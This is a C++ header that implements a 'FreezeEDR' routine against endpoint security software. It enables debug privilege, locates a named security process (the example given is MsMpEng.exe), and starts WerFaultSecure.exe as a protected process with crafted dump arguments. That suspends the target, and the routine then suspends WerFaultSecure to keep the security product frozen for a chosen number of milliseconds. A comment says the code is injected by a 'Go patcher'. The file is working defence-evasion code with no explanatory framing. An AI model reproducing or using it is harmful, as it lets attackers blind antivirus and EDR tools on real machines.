#pragma once
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <sstream>
#include <string>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct _EF_SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime, UserTime, CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    LONG Priority, BasePriority;
    ULONG ContextSwitches, ThreadState, WaitReason;
} EF_SYSTEM_THREAD_INFORMATION;

typedef struct _EF_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset, NumberOfThreads;
    LARGE_INTEGER Reserved[3], CreateTime, UserTime, KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId, InheritedFromUniqueProcessId;
    ULONG HandleCount, SessionId;
    ULONG_PTR PageDirectoryBase;
    SIZE_T PeakVirtualSize, VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize, WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage, QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage, QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage, PeakPagefileUsage, PrivatePageCount;
    LARGE_INTEGER ReadOperationCount, WriteOperationCount, OtherOperationCount;
    LARGE_INTEGER ReadTransferCount, WriteTransferCount, OtherTransferCount;
    EF_SYSTEM_THREAD_INFORMATION Threads[1];
} EF_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* EF_NtQSI)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* EF_NtSuspendProcess)(HANDLE);

#define EF_StateWait 5
#define EF_Suspended 5

static std::wstring ef_HandleToDecimal(HANDLE h) {
    std::wstringstream ss; ss << (UINT_PTR)h; return ss.str();
}

static bool ef_EnableDebugPrivilege() {
    HANDLE hTok = nullptr; TOKEN_PRIVILEGES tp = {}; LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return false;
    if (!LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &luid)) { CloseHandle(hTok); return false; }
    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(hTok);
    return GetLastError() == ERROR_SUCCESS;
}

static EF_NtQSI ef_GetNtQSI() {
    return (EF_NtQSI)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
}

static DWORD ef_GetMainThreadId(DWORD pid) {
    ULONG sz = 0x10000; PVOID buf = nullptr; NTSTATUS st; auto NtQSI = ef_GetNtQSI();
    do {
        buf = VirtualAlloc(nullptr, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) return 0;
        st = NtQSI(SystemProcessInformation, buf, sz, nullptr);
        if (st == STATUS_INFO_LENGTH_MISMATCH) { VirtualFree(buf, 0, MEM_RELEASE); sz *= 2; }
    } while (st == STATUS_INFO_LENGTH_MISMATCH);
    if (!NT_SUCCESS(st)) { VirtualFree(buf, 0, MEM_RELEASE); return 0; }
    DWORD tid = 0;
    auto spi = (EF_SYSTEM_PROCESS_INFORMATION*)buf;
    while (true) {
        if ((DWORD)(ULONG_PTR)spi->UniqueProcessId == pid) {
            if (spi->NumberOfThreads > 0) tid = (DWORD)(ULONG_PTR)spi->Threads[0].ClientId.UniqueThread;
            break;
        }
        if (!spi->NextEntryOffset) break;
        spi = (EF_SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
    }
    VirtualFree(buf, 0, MEM_RELEASE); return tid;
}

static BOOL ef_IsProcessSuspended(DWORD pid) {
    ULONG sz = 0x10000; PVOID buf = nullptr; NTSTATUS st; auto NtQSI = ef_GetNtQSI();
    do {
        buf = VirtualAlloc(nullptr, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) return FALSE;
        st = NtQSI(SystemProcessInformation, buf, sz, nullptr);
        if (st == STATUS_INFO_LENGTH_MISMATCH) { VirtualFree(buf, 0, MEM_RELEASE); sz *= 2; }
    } while (st == STATUS_INFO_LENGTH_MISMATCH);
    if (!NT_SUCCESS(st)) { VirtualFree(buf, 0, MEM_RELEASE); return FALSE; }
    auto spi = (EF_SYSTEM_PROCESS_INFORMATION*)buf;
    while (true) {
        if ((DWORD)(ULONG_PTR)spi->UniqueProcessId == pid) {
            if (!spi->NumberOfThreads) { VirtualFree(buf, 0, MEM_RELEASE); return FALSE; }
            auto ti = (PSYSTEM_THREAD_INFORMATION)((PBYTE)spi + sizeof(SYSTEM_PROCESS_INFORMATION));
            for (ULONG i = 0; i < spi->NumberOfThreads; ++i)
                if (ti[i].ThreadState != EF_StateWait || ti[i].WaitReason != EF_Suspended) {
                    VirtualFree(buf, 0, MEM_RELEASE); return FALSE;
                }
            VirtualFree(buf, 0, MEM_RELEASE); return TRUE;
        }
        if (!spi->NextEntryOffset) break;
        spi = (EF_SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
    }
    VirtualFree(buf, 0, MEM_RELEASE); return FALSE;
}

static BOOL ef_SuspendByPID(DWORD pid) {
    HMODULE h = GetModuleHandleW(L"ntdll.dll"); if (!h) return FALSE;
    EF_NtSuspendProcess NtSP = (EF_NtSuspendProcess)GetProcAddress(h, "NtSuspendProcess");
    if (!NtSP) return FALSE;
    HANDLE hp = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid); if (!hp) return FALSE;
    NTSTATUS st = NtSP(hp); CloseHandle(hp); return NT_SUCCESS(st);
}

static BOOL ef_TerminateByPID(DWORD pid) {
    HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pid); if (!hp) return FALSE;
    BOOL r = TerminateProcess(hp, 1); CloseHandle(hp); return r;
}

class EF_PPLCreator {
    HANDLE m_hProc = nullptr, m_hThread = nullptr;
public:
    ~EF_PPLCreator() { if (m_hProc) CloseHandle(m_hProc); if (m_hThread) CloseHandle(m_hThread); }
    DWORD CreatePPL(DWORD level, std::wstring& cmd) {
        SIZE_T sz = 0; STARTUPINFOEXW siex = {}; siex.StartupInfo.cb = sizeof(siex);
        PROCESS_INFORMATION pi = {}; LPPROC_THREAD_ATTRIBUTE_LIST ptal = nullptr;
        InitializeProcThreadAttributeList(nullptr, 1, 0, &sz);
        ptal = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sz);
        if (!ptal) return 0;
        if (!InitializeProcThreadAttributeList(ptal, 1, 0, &sz)) { HeapFree(GetProcessHeap(), 0, ptal); return 0; }
        if (!UpdateProcThreadAttribute(ptal, 0, PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL, &level, sizeof(level), nullptr, nullptr)) {
            DeleteProcThreadAttributeList(ptal); HeapFree(GetProcessHeap(), 0, ptal); return 0;
        }
        siex.lpAttributeList = ptal;
        if (!CreateProcessW(nullptr, (LPWSTR)cmd.c_str(), nullptr, nullptr, TRUE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS,
            nullptr, nullptr, &siex.StartupInfo, &pi)) {
            DeleteProcThreadAttributeList(ptal); HeapFree(GetProcessHeap(), 0, ptal); return 0;
        }
        DeleteProcThreadAttributeList(ptal); HeapFree(GetProcessHeap(), 0, ptal);
        m_hProc = pi.hProcess; m_hThread = pi.hThread; return pi.dwProcessId;
    }
};

struct EF_PauseParams { DWORD targetPID, werPID; };

static DWORD WINAPI ef_PauseCheck(LPVOID lp) {
    auto* p = (EF_PauseParams*)lp;
    while (!ef_IsProcessSuspended(p->targetPID)) {}
    ef_SuspendByPID(p->werPID);
    return 0;
}

static BOOL ef_FreezeRun(DWORD targetPID, DWORD targetTID, DWORD sleepMs) {
    SECURITY_ATTRIBUTES sa = {}; sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
    std::wstring dumpFile = L"dump_" + std::to_wstring(targetPID) + L".txt";
    HANDLE hDump = CreateFileW(dumpFile.c_str(), GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDump == INVALID_HANDLE_VALUE) return FALSE;
    HANDLE hCancel = CreateEventW(&sa, TRUE, FALSE, nullptr);
    if (!hCancel) { CloseHandle(hDump); return FALSE; }
    std::wstring werPath = L"C:\\Windows\\System32\\WerFaultSecure.exe";
    std::wstringstream cmd;
    cmd << werPath << L" /h /pid " << targetPID << L" /tid " << targetTID
        << L" /encfile " << ef_HandleToDecimal(hDump)
        << L" /cancel " << ef_HandleToDecimal(hCancel)
        << L" /type 268310";
    std::wstring cmdLine = cmd.str();
    EF_PPLCreator creator;
    DWORD werPID = creator.CreatePPL(0, cmdLine);
    if (!werPID) { CloseHandle(hDump); CloseHandle(hCancel); return FALSE; }
    EF_PauseParams* params = new EF_PauseParams{ targetPID, werPID };
    HANDLE hThread = CreateThread(nullptr, 0, ef_PauseCheck, params, 0, nullptr);
    Sleep(sleepMs);
    ef_TerminateByPID(werPID);
    if (hThread) CloseHandle(hThread);
    delete params; CloseHandle(hDump); CloseHandle(hCancel);
    DeleteFileW(dumpFile.c_str());
    return TRUE;
}

static DWORD ef_FindProcessByName(const wchar_t* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) }; DWORD pid = 0;
    if (Process32FirstW(snap, &pe))
        do { if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; } }
        while (Process32NextW(snap, &pe));
    CloseHandle(snap); return pid;
}

// FreezeEDR is the single entry point injected by the Go patcher.
// processName: wide string of the EDR .exe (e.g. L"MsMpEng.exe")
// sleepMs: milliseconds to hold the freeze
static void FreezeEDR(const wchar_t* processName, DWORD sleepMs) {
    ef_EnableDebugPrivilege();
    DWORD pid = ef_FindProcessByName(processName);
    if (!pid) return;
    DWORD tid = ef_GetMainThreadId(pid);
    if (!tid) return;
    ef_FreezeRun(pid, tid, sleepMs);
}
